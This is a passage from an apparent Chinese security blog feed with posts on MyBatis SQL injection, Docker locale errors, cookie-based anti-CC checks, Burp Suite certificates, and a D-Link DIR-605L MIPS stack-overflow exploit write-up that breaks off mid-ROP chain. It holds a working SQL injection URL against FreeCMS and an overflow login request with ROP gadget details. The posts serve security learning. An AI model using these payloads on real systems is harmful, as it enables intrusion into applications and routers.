&lt;h2 id=&quot;漏洞测试&quot;&gt;漏洞测试&lt;/h2&gt;&lt;p&gt;测试版本：最新版2.0.10&lt;/p&gt;
&lt;p&gt;当Yii框架开启了debug和dev模式的时候，报错页面存在通用性的反射XSS。Yii提供的
    
    </summary>
    
      <category term="cve and others" scheme="http://xdxd.love/categories/cve-and-others/"/>
    
    
  </entry>
  
  <entry>
    <title>审计mybatis的sql注入</title>
    <link href="http://xdxd.love/2017/05/24/%E5%AE%A1%E8%AE%A1mybatis%E7%9A%84sql%E6%B3%A8%E5%85%A5new/"/>
    <id>http://xdxd.love/2017/05/24/审计mybatis的sql注入new/</id>
    <published>2017-05-24T07:27:24.000Z</published>
    <updated>2017-05-24T06:42:22.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="mybatis_概述">mybatis 概述</h1><p><a href="http://www.mybatis.org/" target="_blank" rel="external">MyBatis</a>是支持定制化 SQL、存储过程以及高级映射的优秀的持久层框架。MyBatis 避免了几乎所有的 JDBC 代码和手动设置参数以及获取结果集。MyBatis 可以对配置和原生Map使用简单的 XML 或注解，将接口和 Java 的 POJOs(Plain Old Java Objects,普通的 Java对象)映射成数据库中的记录</p>
<h1 id="mybatis存在的sql注入问题">mybatis存在的sql注入问题</h1><p>mybatis避免了用户直接拼接SQL语句，但是认为只要使用了mybatis就可以杜绝SQL注入的观点是不正确的。mybatis在配置SQL语句的时候，有两种描述参数的方式。<code>#{}</code>和<code>${}</code>。</p>
<p>比如：</p>
<pre><code>&lt;<span class="keyword">select</span> id=<span class="string">"selectPerson"</span> parameterType=<span class="string">"int"</span> resultType=<span class="string">"hashmap"</span>&gt;
  <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> PERSON <span class="keyword">WHERE</span> ID = <span class="preprocessor">#{id}</span>
&lt;/<span class="keyword">select</span>&gt;
</code></pre><p>这个语句被称作 selectPerson，接受一个 int（或 Integer）类型的参数，并返回一个 HashMap类型的对象，其中的键是列名，值便是结果行中的对应值。</p>
<p>注意参数符号：</p>
<pre><code>#{<span class="ruby">id}</span>
</code></pre><p>这就告诉 MyBatis 创建一个预处理语句参数，通过 JDBC，这样的一个参数在 SQL中会由一个“?”来标识，并被传递到一个新的预处理语句中，就像这样：</p>
<pre><code>// Similar JDBC <span class="preprocessor">code</span>, NOT MyBatis…
<span class="keyword">String </span><span class="keyword">selectPerson </span>= <span class="string">"SELECT * FROM PERSON WHERE ID=?"</span><span class="comment">;</span>
<span class="label">PreparedStatement</span> ps = conn.prepareStatement(<span class="keyword">selectPerson);
</span><span class="label">ps.setInt</span>(<span class="number">1</span>,id)<span class="comment">;</span>
</code></pre><p>使用<code>#</code>mybatis会使用预编译来处理参数，这样子可以避免SQL注入。</p>
<p>但是使用<code>$</code>描述参数会直接把变量拼接到SQL语句中，不做任何处理。相当于直接字符串拼接SQL。这样的方式就可能存在SQL注入。下面的描述来自mybatis官方文档。</p>
<pre><code>默认情况下,使用#{}格式的语法会导致 MyBatis 创建预处理语句属性并安全地设置值（比如?）。这样做更安全，更迅速，通常也是首选做法，不过有时你只是想直接在 SQL 语句中插入一个不改变的字符串。比如，像 <span class="keyword">ORDER</span> <span class="keyword">BY</span>，你可以这样来使用：

<span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="label">${columnName}</span>
这里 MyBatis 不会修改或转义字符串。

<span class="keyword">NOTE</span> 以这种方式接受从用户输出的内容并提供给语句中不变的字符串是不安全的，会导致潜在的 SQL 注入攻击，因此要么不允许用户输入这些字段，要么自行转义并检验。
</code></pre><h1 id="demo演示">demo演示</h1><p>使用<a href="http://www.cnblogs.com/zhanjindong/p/3397828.html" target="_blank" rel="external">MyBatis使用示例</a>作为demo测试。</p>
<p>mapper文件：</p>
<pre><code><span class="pi">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span>
<span class="doctype">&lt;!DOCTYPE mapper
        PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN"
        "http://mybatis.org/dtd/mybatis-3-mapper.dtd"&gt;</span>
<span class="tag">&lt;<span class="title">mapper</span> <span class="attribute">namespace</span>=<span class="value">"test.mybatis.UserMapper"</span>&gt;</span>
    <span class="comment">&lt;!-- 这里namespace必须是UserMapper接口的路径” --&gt;</span>
    <span class="tag">&lt;<span class="title">insert</span> <span class="attribute">id</span>=<span class="value">"insertUser"</span> <span class="attribute">parameterType</span>=<span class="value">"User"</span>&gt;</span>
        insert into user(name,age) values(#{name},#{age})
        <span class="comment">&lt;!-- 这里sql结尾不能加分号，否则报“ORA-00911”的错误 --&gt;</span>
    <span class="tag">&lt;/<span class="title">insert</span>&gt;</span>
    <span class="comment">&lt;!-- 这里的id必须和UserMapper接口中的接口方法名相同 --&gt;</span>
    <span class="tag">&lt;<span class="title">select</span> <span class="attribute">id</span>=<span class="value">"getUser"</span> <span class="attribute">resultType</span>=<span class="value">"User"</span>&gt;</span>
        select * from user where name=#{name}
    <span class="tag">&lt;/<span class="title">select</span>&gt;</span>
<span class="tag">&lt;/<span class="title">mapper</span>&gt;</span>
</code></pre><p>在输入中插入单引号</p>
<pre><code><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">getUser</span>(<span class="params"></span>) </span>{
    SqlSession sqlSession = sqlSessionFactory.openSession();
    <span class="keyword">try</span> {
        UserMapper userMapper = sqlSession.getMapper(UserMapper.class);
        User user = userMapper.getUser(<span class="string">"'zhangsan"</span>);
        System.<span class="keyword">out</span>.println(<span class="string">"name: "</span> + user.getName() + <span class="string">"|age: "</span>
                + user.getAge());
    } <span class="keyword">finally</span> {
        sqlSession.close();
    }
</code></pre><p>查看执行的sql语句：</p>
<p><img src="/images/mybatis21.png" alt=""></p>
<p>可以看到输入被单引号包裹，并且对字符串中的单引号进行了转义。</p>
<p>将<code>#</code>改成<code>$</code>,mapper文件为：</p>
<pre><code>&lt;<span class="keyword">select</span> id=<span class="string">"getUser"</span> resultType=<span class="string">"User"</span>&gt;
    <span class="keyword">select</span> * <span class="keyword">from</span> user <span class="keyword">where</span> name=${_parameter}
&lt;/<span class="keyword">select</span>&gt;
</code></pre><p>这里由于代码的写法问题，name需要改成_parameter,参考<a href="http://woshixy.blog.51cto.com/5637578/1180914" target="_blank" rel="external">Mybatis中传参包There is no getter for property named XXX in class java.lang.String</a>。</p>
<p>查看执行的SQL语句：</p>
<p><img src="/images/mybatis22.png" alt=""></p>
<p>输入没有任何改变的拼接到SQL中，造成了SQL注入。</p>
<h1 id="实战分析">实战分析</h1><p>mybatis generator插件默认生成的order by 条件是使用<code>$</code>表示变量。</p>
<pre><code>...
 <span class="tag">&lt;<span class="title">select</span> <span class="attribute">id</span>=<span class="value">"selectByExample"</span> <span class="attribute">resultMap</span>=<span class="value">"BaseResultMap"</span> <span class="attribute">parameterType</span>=<span class="value">"com.tgwoo.ctspmt.model.MtVMsgItemExample"</span> &gt;</span>
    <span class="tag">&lt;<span class="title">include</span> <span class="attribute">refid</span>=<span class="value">"OracleDialectPrefix"</span> /&gt;</span>
    select
    <span class="tag">&lt;<span class="title">if</span> <span class="attribute">test</span>=<span class="value">"distinct"</span> &gt;</span>
      distinct
    <span class="tag">&lt;/<span class="title">if</span>&gt;</span>
    <span class="tag">&lt;<span class="title">include</span> <span class="attribute">refid</span>=<span class="value">"Base_Column_List"</span> /&gt;</span>
    from CTSPMT.MT_V_MSG_ITEM
    <span class="tag">&lt;<span class="title">if</span> <span class="attribute">test</span>=<span class="value">"_parameter != null"</span> &gt;</span>
      <span class="tag">&lt;<span class="title">include</span> <span class="attribute">refid</span>=<span class="value">"Example_Where_Clause"</span> /&gt;</span>
    <span class="tag">&lt;/<span class="title">if</span>&gt;</span>
    <span class="tag">&lt;<span class="title">if</span> <span class="attribute">test</span>=<span class="value">"orderByClause != null"</span> &gt;</span>
      order by ${orderByClause}
    <span class="tag">&lt;/<span class="title">if</span>&gt;</span>
    <span class="tag">&lt;<span class="title">include</span> <span class="attribute">refid</span>=<span class="value">"OracleDialectSuffix"</span> /&gt;</span>
  <span class="tag">&lt;/<span class="title">select</span>&gt;</span>
...
  <span class="tag">&lt;<span class="title">sql</span> <span class="attribute">id</span>=<span class="value">"OracleDialectPrefix"</span> &gt;</span>
    <span class="tag">&lt;<span class="title">if</span> <span class="attribute">test</span>=<span class="value">"page != null"</span> &gt;</span>
      select * from ( select row_.*, rownum rownum_ from ( 
    <span class="tag">&lt;/<span class="title">if</span>&gt;</span>
  <span class="tag">&lt;/<span class="title">sql</span>&gt;</span>
  <span class="tag">&lt;<span class="title">sql</span> <span class="attribute">id</span>=<span class="value">"OracleDialectSuffix"</span> &gt;</span>
    <span class="tag">&lt;<span class="title">if</span> <span class="attribute">test</span>=<span class="value">"page != null"</span> &gt;</span>
      <span class="cdata">&lt;![CDATA[ ) row_ ) where rownum_ &gt; #{page.begin} and rownum_ &lt;= #{page.end} ]]&gt;</span>
    <span class="tag">&lt;/<span class="title">if</span>&gt;</span>
  <span class="tag">&lt;/<span class="title">sql</span>&gt;</span>
...
</code></pre><p>所以使用mybatis generator插件生成的代码中，需要自己过滤order by参数，如果用户可控就会导致SQL注入。而大部分情况下，开发者可能没有意识到这个问题。</p>
<p>以freecms为例。<a href="http://www.freeteam.cn/" target="_blank" rel="external">Freecms</a>是一款开源javacms。最新版下载<a href="http://www.freeteam.cn/freecms1.5.rar" target="_blank" rel="external">地址</a>。freecms中的orderby都是使用的<code>$</code>描述变量。</p>
<p><img src="/images/mybatis23.png" alt=""></p>
<p>前面的分析可以知道，这种情况，mybatis会直接拼接字符串到SQL中不做任何处理。</p>
<p>注册用户登录访问：</p>
<pre><code>http://192.168.99.100:8080/freecms/member/creditlog_list.do?order=extractvalue(1,concat(0x7C,(select%20user()),0x7C))
</code></pre><p><img src="/images/mybatis24.png" alt=""></p>
<p>查看执行的SQL为：</p>
<p><img src="/images/mybatis25.png" alt=""></p>
<h1 id="修复方案">修复方案</h1><p>尽量使用<code>#</code>描述参数，如果一定要使用<code>$</code>，则需要自己过滤用户输入。</p>
<h1 id="容易发生注入的点">容易发生注入的点</h1><p><a href="https://mp.weixin.qq.com/s?__biz=MjM5OTk2MTMxOQ==&amp;mid=2727827368&amp;idx=1&amp;sn=765d0835f0069b5145523c31e8229850&amp;mpshare=1&amp;scene=1&amp;srcid=0926a6QC3pGbQ3Pznszb4n2q#rd" target="_blank" rel="external">Mybatis框架下SQL注入漏洞面面观</a>中提到了3个点。</p>
<pre><code>1. 模糊查询like SQL注入修复建议
按照新闻标题对新闻进行模糊查询，可将SQL查询语句设计如下：
<span class="operator"><span class="keyword">select</span> * <span class="keyword">from</span> news <span class="keyword">where</span> tile <span class="keyword">like</span> <span class="keyword">concat</span>(‘%’,#{title}, ‘%’)，
采用预编译机制，避免了<span class="keyword">SQL</span>语句拼接的问题，从根源上防止了<span class="keyword">SQL</span>注入漏洞的产生。

<span class="number">2.</span>  <span class="keyword">in</span>之后的参数<span class="keyword">SQL</span>注入修复建议
在对新闻进行同条件多值查询的时候，可使用Mybatis自带循环指令解决<span class="keyword">SQL</span>语句动态拼接的问题：
<span class="keyword">select</span> * <span class="keyword">from</span> news <span class="keyword">where</span> <span class="keyword">id</span> <span class="keyword">in</span>
&lt;foreach collection=<span class="string">"ids"</span> item=<span class="string">"item"</span> <span class="keyword">open</span>=<span class="string">"("</span>separator=<span class="string">","</span> <span class="keyword">close</span>=<span class="string">")"</span>&gt;#{item} &lt;/foreach&gt;

<span class="number">3.</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">SQL</span>注入修复建议<span class="comment">--在Java层面做映射</span>
预编译机制只能处理查询参数，其他地方还需要研发人员根据具体情况来解决。如前面提到的排序情景： <span class="keyword">Select</span> * <span class="keyword">from</span> news <span class="keyword">where</span> title =‘京东’ <span class="keyword">order</span> <span class="keyword">by</span> #{<span class="keyword">time</span>} <span class="keyword">asc</span>，这里<span class="keyword">time</span>不是查询参数，无法使用预编译机制，只能这样拼接：<span class="keyword">Select</span> * <span class="keyword">from</span> news <span class="keyword">where</span> title =‘京东’ <span class="keyword">order</span> <span class="keyword">by</span> ${<span class="keyword">time</span>} <span class="keyword">asc</span> 。
针对这种情况研发人员可以在<span class="keyword">java</span>层面做映射来进行解决。如当存在发布时间<span class="keyword">time</span>和点击量click两种排序选择时，我们可以限制用户只能输入<span class="number">1</span>和<span class="number">2</span>。当用户输入<span class="number">1</span>时，我们在代码层面将其映射为<span class="keyword">time</span>，当用户输入<span class="number">2</span>时，将其映射为click。而当用户输入<span class="number">1</span>和<span class="number">2</span>之外的其他内容时，我们可以将其转换为默认排序选择<span class="keyword">time</span>(或者click)。</span>
</code></pre><p>目前在使用mybatis中，一般会使用插件自动生成代码。插件自动生成的代码中，in语句已经是默认安全的方式了。只有orderby和limit处是使用字符串拼接。而默认情况下应该是没有like语句。如果程序员需要使用like需要自己实现。</p>
<p><img src="/images/mybatisa1.png" alt=""></p>
<p><img src="/images/mybatisa2.png" alt=""></p>
<h1 id="参考资料">参考资料</h1><p><a href="https://mp.weixin.qq.com/s?__biz=MjM5OTk2MTMxOQ==&amp;mid=2727827368&amp;idx=1&amp;sn=765d0835f0069b5145523c31e8229850&amp;mpshare=1&amp;scene=1&amp;srcid=0926a6QC3pGbQ3Pznszb4n2q#rd" target="_blank" rel="external">Mybatis框架下SQL注入漏洞面面观</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;mybatis_概述&quot;&gt;mybatis 概述&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;http://www.mybatis.org/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;MyBatis&lt;/a&gt;是支持定制化 SQL、存储过程以及高级映射的优秀的持
    
    </summary>
    
      <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="java" scheme="http://xdxd.love/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>docker下locale与编码问题</title>
    <link href="http://xdxd.love/2017/04/05/docker%E4%B8%8Blocale%E4%B8%8E%E7%BC%96%E7%A0%81%E9%97%AE%E9%A2%98/"/>
    <id>http://xdxd.love/2017/04/05/docker下locale与编码问题/</id>
    <published>2017-04-05T11:27:47.000Z</published>
    <updated>2017-04-06T05:58:05.000Z</updated>
    
    <content type="html"><![CDATA[<p>在docker ubuntu:16.04中部署<a href="https://github.com/0xbug/SQLiScanner，遇到报错：" target="_blank" rel="external">https://github.com/0xbug/SQLiScanner，遇到报错：</a></p>
<pre><code>UnicodeDecodeError at /api/har/upload
<span class="attribute">'ascii</span>' codec can<span class="attribute">'t</span> decode byte <span class="number">0</span>xef <span class="keyword">in</span> position <span class="number">642</span>: ordinal <span class="keyword">not</span> <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">128</span>)
</code></pre><p>在python编程中经常见到这个错误，是由于没有使用utf8编码导致的。但是这里代码中指定了<br>utf8编码，而且在其他的环境中部署是正常的。</p>
<p>经过一番google，发现是docker中ubuntu的问题。参考这里：</p>
<p><a href="https://github.com/buildinspace/peru/issues/136" target="_blank" rel="external">https://github.com/buildinspace/peru/issues/136</a><br><a href="http://jaredmarkell.com/docker-and-locales/" target="_blank" rel="external">http://jaredmarkell.com/docker-and-locales/</a></p>
<p>docker中locale变量设置问题。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在docker ubuntu:16.04中部署&lt;a href=&quot;https://github.com/0xbug/SQLiScanner，遇到报错：&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/0xbug/SQLiS
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>python处理Set-Cookie</title>
    <link href="http://xdxd.love/2017/03/30/python%E5%A4%84%E7%90%86Set-Cookie/"/>
    <id>http://xdxd.love/2017/03/30/python处理Set-Cookie/</id>
    <published>2017-03-30T07:50:18.000Z</published>
    <updated>2017-03-30T08:06:04.000Z</updated>
    
    <content type="html"><![CDATA[<p>之前写了一个小脚本，监控网站帖子变化。最近由于这个论坛被CC了，加了360网站宝的防护。导致脚本失效了。所以花了一点时间看了下360网站宝的防CC策略。</p>
<p>除了对访问频率的限制，还通过set-cookie设置了一些cookie。通过检查cookie的<br>有效性来决定是否可以访问。</p>
<p>当没有cookie的访问的时候，是来到一个设置cookie的中间页面。</p>
<p><img src="/images/session1.png" alt=""></p>
<p><img src="/images/session2.png" alt=""></p>
<p>拿到有效的cookie再次访问，才会真正的获得内容。而且cookie是存在有效时间的。获得一个cookie放到脚本里的思路也是不行的。</p>
<p>所以需要脚本模拟浏览器解析setcookie的设置，根据服务器返回的setcookie头设置cookie，再去请求内容。这个需求使用requests库的session对象，可以方便的实现。</p>
<p><a href="http://docs.python-requests.org/zh_CN/latest/user/advanced.html" target="_blank" rel="external">http://docs.python-requests.org/zh_CN/latest/user/advanced.html</a></p>
<pre><code>s = requests.Session()

s.<span class="literal">get</span>('http:<span class="comment">//httpbin.org/cookies/set/sessioncookie/123456789')</span>
r = s.<span class="literal">get</span>(<span class="string">"http://httpbin.org/cookies"</span>)

<span class="keyword">print</span>(r.text)
# '{<span class="string">"cookies"</span>: {<span class="string">"sessioncookie"</span>: <span class="string">"123456789"</span>}}'
</code></pre><p>360网站宝设置了BuJ8<em>2132</em>开头的多个cookie。</p>
<p><img src="/images/session3.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前写了一个小脚本，监控网站帖子变化。最近由于这个论坛被CC了，加了360网站宝的防护。导致脚本失效了。所以花了一点时间看了下360网站宝的防CC策略。&lt;/p&gt;
&lt;p&gt;除了对访问频率的限制，还通过set-cookie设置了一些cookie。通过检查cookie的&lt;br&gt;有效
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>mac上安装burpsuite证书</title>
    <link href="http://xdxd.love/2017/03/15/mac%E4%B8%8A%E5%AE%89%E8%A3%85burpsuite%E8%AF%81%E4%B9%A6/"/>
    <id>http://xdxd.love/2017/03/15/mac上安装burpsuite证书/</id>
    <published>2017-03-15T07:01:29.000Z</published>
    <updated>2017-03-15T08:14:13.000Z</updated>
    
    <content type="html"><![CDATA[<p>环境：burpsuite 1.7.12  mac sierra</p>
<p>问题：burpsuite无法拦截https的请求，报错信息为：使用了不受支持的协议。ERR_SSL_VERSION_OR_CIPHER_MISMATCH.协议不受支持。</p>
<p><img src="/images/burpsuitecert1.png" alt=""></p>
<p>思路：考虑是证书的问题。查看project options的SSL配置。从default修改为Use custom pro<br>tocols and ciphers</p>
<p><img src="/images/burpsuitecert2.png" alt=""></p>
<p>发现浏览器报证书不正确，手动同意以后可以打开网站。但是外部的https无法自动加载。</p>
<p>最终解决方案。在mac上导入burpsuite的证书。</p>
<p>访问<a href="http://burp/cert" target="_blank" rel="external">http://burp/cert</a> 下载证书。然后打开mac的钥匙串访问。导入证书并且修改<br>PortSwigger CA为始终信任。<br><img src="/images/burpsuitecert3.png" alt=""></p>
<p>最终效果，浏览器显示为信任。</p>
<p><img src="/images/burpsuitecert4.png" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;环境：burpsuite 1.7.12  mac sierra&lt;/p&gt;
&lt;p&gt;问题：burpsuite无法拦截https的请求，报错信息为：使用了不受支持的协议。ERR_SSL_VERSION_OR_CIPHER_MISMATCH.协议不受支持。&lt;/p&gt;
&lt;p&gt;&lt;img s
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>一个mips栈溢出利用</title>
    <link href="http://xdxd.love/2016/12/09/%E4%B8%80%E4%B8%AAmips%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8/"/>
    <id>http://xdxd.love/2016/12/09/一个mips栈溢出利用/</id>
    <published>2016-12-09T01:58:59.000Z</published>
    <updated>2016-12-09T02:09:26.000Z</updated>
    
    <content type="html"><![CDATA[<p>翻译自<a href="http://www.devttys0.com/2012/10/exploiting-a-mips-stack-overflow/" target="_blank" rel="external">http://www.devttys0.com/2012/10/exploiting-a-mips-stack-overflow/</a>.这是D-link路由器一个未登录前的栈溢出利用.本文并非为原文的对照翻译,而是侧重记录在实践测试过程的问题和分析，算是一个读书笔记。</p>
<a id="more"></a>
<h1 id="静态分析">静态分析</h1><p>DIR-605L路由器存在一个登陆处的栈溢出.登录时候的表单中存在一个FILECODE的参数,这个参数是用来识别登录窗口显示的验证码图片.服务端获取这个参数之后存在了$s1寄存器中.</p>
<pre><code><span class="keyword">la</span>      <span class="label">$t9</span>, websGetVar
<span class="keyword">move</span>    <span class="label">$s7</span>, <span class="label">$v0</span>
jalr    <span class="label">$t9</span> ; websGetVar
addiu   <span class="label">$a1</span>, (aFilecode - 0x4A0000)  # “FILECODE"
lw      <span class="label">$gp</span>, 0x290+var_280(<span class="label">$sp</span>)
<span class="keyword">move</span>    <span class="label">$s1</span>, <span class="label">$v0</span>
<span class="keyword">li</span>      <span class="label">$v0</span>, 1
</code></pre><p>这里一个点就是MIPS的分支延迟,位于跳转后面的一条指令会在跳转之前执行.所以实际上执行的是</p>
<pre><code>addiu   <span class="variable">$a1</span>, (aFilecode - <span class="number">0x4A0000</span>)  <span class="preprocessor"># <span class="string">"FILECODE"</span></span>
jalr    <span class="variable">$t9</span> <span class="comment">; websGetVar</span>
</code></pre><p>获得的FILECODE参数值存在$vo中,又存入$s1.</p>
<p>然后获取的值作为getAuthCode函数的第二个参数，传递给getAuthCode.mips中函数调用参数通过$a0-$a3传递。超过4个的参数使用栈传递。</p>
<pre><code>loc_455FF0:
la      <span class="variable">$t9</span>, getAuthCode   <span class="comment"># load address </span>
move    <span class="variable">$a1</span>, <span class="variable">$s1</span>   <span class="comment"># a1=s1 </span>
jalr    <span class="variable">$t9</span> ; getAuthCode  <span class="comment"># run getAuthCode</span>
move    <span class="variable">$a0</span>, <span class="variable">$s0</span> <span class="comment"># a0=s0</span>
</code></pre><p>getAuthCode函数中将FILECODE又存到$s1寄存器，然后作为第三个参数传递给sprintf。</p>
<pre><code><span class="keyword">li</span>      <span class="label">$gp</span>, 0x98AFC
addu    <span class="label">$gp</span>, <span class="label">$t9</span>
addiu   <span class="label">$sp</span>, -0xC0
<span class="keyword">sw</span>      <span class="label">$ra</span>, 0xC0+var_8(<span class="label">$sp</span>)
<span class="keyword">sw</span>      <span class="label">$s3</span>, 0xC0+var_C(<span class="label">$sp</span>)
<span class="keyword">sw</span>      <span class="label">$s2</span>, 0xC0+var_10(<span class="label">$sp</span>)
<span class="keyword">sw</span>      <span class="label">$s1</span>, 0xC0+var_14(<span class="label">$sp</span>)
<span class="keyword">sw</span>      <span class="label">$s0</span>, 0xC0+var_18(<span class="label">$sp</span>)
<span class="keyword">sw</span>      <span class="label">$gp</span>, 0xC0+var_B0(<span class="label">$sp</span>)
<span class="keyword">la</span>      <span class="label">$t9</span>, memset
addiu   <span class="label">$s2</span>, <span class="label">$sp</span>, 0xC0+var_A8
<span class="keyword">move</span>    <span class="label">$s1</span>, <span class="label">$a1</span>   # s1=a1

<span class="keyword">move</span>    <span class="label">$a0</span>, <span class="label">$s0</span>  # a0=s0
<span class="keyword">move</span>    <span class="label">$a2</span>, <span class="label">$s1</span> #a2=s1
<span class="keyword">la</span>      <span class="label">$a1</span>, aIg_smtp_email_  # <span class="string">"ig.smtp_email_addr"</span>
<span class="keyword">la</span>      <span class="label">$t9</span>, sprintf
nop
jalr    <span class="label">$t9</span> ; sprintf
addiu   <span class="label">$a1</span>, (aVarAuthS_msg - 0x4A0000)  # <span class="string">"/var/auth/%s.msg"</span>
</code></pre><p>sprintf 函数一共接收了3个参数。</p>
<p>sprintf()函数用于将格式化的数据写入字符串，其原型为：</p>
<pre><code><span class="function"><span class="keyword">int</span> <span class="title">sprintf</span><span class="params">(<span class="keyword">char</span> *str, <span class="keyword">char</span> * format [, argument, ...])</span></span>;
</code></pre><p>用于将格式化的字符串写入第一个参数中。这里a0=s0.而s0在栈上的地位为：</p>
<pre><code>jalr    <span class="variable">$t9</span> ; memset
addiu   <span class="variable">$s0</span>, <span class="variable">$sp</span>, <span class="number">0xC0</span>+var_8<span class="number">0</span>
lw      <span class="variable">$gp</span>, <span class="number">0xC0</span>+var_B<span class="number">0</span>(<span class="variable">$sp</span>)
move    <span class="variable">$a0</span>, <span class="variable">$s0</span>
move    <span class="variable">$a1</span>, <span class="variable">$zero</span>
la      <span class="variable">$t9</span>, memset
</code></pre><p>这是一个典型的栈缓冲区溢出，通过这个溢出可以覆盖存在栈上的寄存器内容和程序返回地址。偏移也比较容易计算。可以通过以下post请求进行验证。</p>
<pre><code><span class="request">POST <span class="string">/goform/formLogin</span> HTTP/1.1</span>
<span class="attribute">Host</span>: <span class="string">localhost</span>
<span class="attribute">User-Agent</span>: <span class="string">Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0</span>
<span class="attribute">Accept</span>: <span class="string">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="attribute">Accept-Language</span>: <span class="string">en-US,en;q=0.5</span>
<span class="attribute">Accept-Encoding</span>: <span class="string">gzip, deflate</span>
<span class="attribute">Connection</span>: <span class="string">keep-alive</span>
<span class="attribute">Content-Type</span>: <span class="string">application/x-www-form-urlencoded</span>
<span class="attribute">Content-Length</span>: <span class="string">257</span>

<span class="cpp">VERIFICATION_CODE=myvoiceismypassportverifyme&amp;FILECODE=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADDDD&amp;login_name=&amp;curTime=<span class="number">1348588030496</span>&amp;login_n=admin&amp;login_pass=Zm9vb255b3UA&amp;VER_CODE=</span>
</code></pre><p>先用qemu启动boa程序。</p>
<p><img src="/images/mipsstackexp1.png" alt=""></p>
<p>程序触发段错误低位为44444444.<br><img src="/images/mipsstackexp2.png" alt=""></p>
<p>返回地址和寄存器 s0-s3都可被覆盖。<br><img src="/images/mipsstackexp3.png" alt=""></p>
<p>编写exploit之前需要注意几点。一是payload不能有NULL，而且不能有字符’g’.因为在payload进入getAuthCode之前有一个字符处理逻辑。</p>
<p><img src="/images/mipsstackexp4.png" alt=""></p>
<p>如果存在字符g，则在g后一个字节置0。sb $zero ,!($v0)</p>
<p>mips的exp编写中还有一个问题就是cache incoherency。MIPS CPUs有两个独立的cache：指令cache和数据cache。指令和数据分别在两个不同的缓存中。当缓存满了，会触发flush，将数据写回到主内存。攻击者的攻击payload通常会被应用当做数据来处理，存储在数据缓存中。当payload触发漏洞，劫持程序执行流程的时候，会去执行内存中的shellcode。如果数据缓存没有触发flush的话，shellcode依然存储在缓存中，而没有写入主内存。这会导致程序执行了本该存储shellcode的地址处随机的代码，导致不可预知的后果。</p>
<p>最简单可靠的让缓存数据写入内存的方式是调用一个堵塞函数。比如sleep(1)或者其他类似的函数。sleep的过程中，处理器会切换上下文让给其他正在执行的程序，缓存会自动执行flush。</p>
<p>比较好的方式利用ROP执行sleep(1)函数。使用ida mips rop插件在libc中搜索 li $a0,1</p>
<pre><code>Python&gt;mipsrop.find(<span class="string">"li $a0,1"</span>)
----------------------------------------------------------------------------------------------------------------
|  Address     |  Action                                              |  Control Jump                          |
----------------------------------------------------------------------------------------------------------------
|  <span class="number">0x000248D4</span>  |  li <span class="variable">$a0</span>,<span class="number">1</span>                                            |  jalr  <span class="variable">$s1</span>                             |
|  <span class="number">0x00011044</span>  |  li <span class="variable">$a0</span>,<span class="number">1</span>                                            |  jalr  <span class="variable">$v0</span>                             |
|  <span class="number">0x0002B068</span>  |  li <span class="variable">$a0</span>,<span class="number">1</span>                                            |  jr    <span class="number">0x28</span>+var_4(<span class="variable">$sp</span>)                 |
|  <span class="number">0x0002B45C</span>  |  li <span class="variable">$a0</span>,<span class="number">1</span>                                            |  jr    <span class="number">0x28</span>+var_4(<span class="variable">$sp</span>)                 |
|  <span class="number">0x0002B5C8</span>  |  li <span class="variable">$a0</span>,<span class="number">1</span>                                            |  jr    <span class="number">0x28</span>+var_4(<span class="variable">$sp</span>)                 |
|  <span class="number">0x0002B864</span>  |  li <span class="variable">$a0</span>,<span class="number">1</span>                                            |  jr    <span class="number">0x30</span>+var_4(<span class="variable">$sp</span>)                 |
|  <span class="number">0x0002BD00</span>  |  li <span class="variable">$a0</span>,<span class="number">1</span>                                            |  jr    <span class="number">0x28</span>+var_8(<span class="variable">$sp</span>)                 |
----------------------------------------------------------------------------------------------------------------
Found <span class="number">7</span> matching gadgets
</code></pre><p>0x248D4处代码。</p>
<pre><code>li      <span class="variable">$a0</span>, <span class="number">1</span>
move    <span class="variable">$t9</span>, <span class="variable">$s1</span>
jalr    <span class="variable">$t9</span> ; sub_244E<span class="number">0</span>
ori     <span class="variable">$a1</span>, <span class="variable">$s0</span>, <span class="number">2</span>
ori     <span class="variable">$a1</span>, <span class="variable">$s0</span>, <span class="number">2</span>
move    <span class="variable">$t9</span>, <span class="variable">$s1</span>
jalr    <span class="variable">$t9</span> ; sub_244E<span class="number">0</span>
li      <span class="variable">$a0</span>, <span class="number">2</span>
</code></pre><p>将$a0设置为1，复制$s1的值到$t9,然后执行$t9的函数，而$s1使我们通过溢出可以控制的。非常适合做为rop的gadget。</p>
<p>整个ROP的流程最基本的思路是，覆盖返回地址，返回地址指向栈上我们部署的shellcode地址。但是由于缓存的问题，需要先指向执行sleep，在指向shellcode的地址。</p>
<p>devttys0中第一个gadget只是设置了a0的值，即设置了sleep函数的参数。下一个gadget是libc.so中的0x2B954.</p>
<pre><code>LOAD<span class="value">:<span class="number">0002</span>B954                 move    <span class="variable">$t9</span>, <span class="variable">$s2</span>
LOAD:<span class="number">0002</span>B958
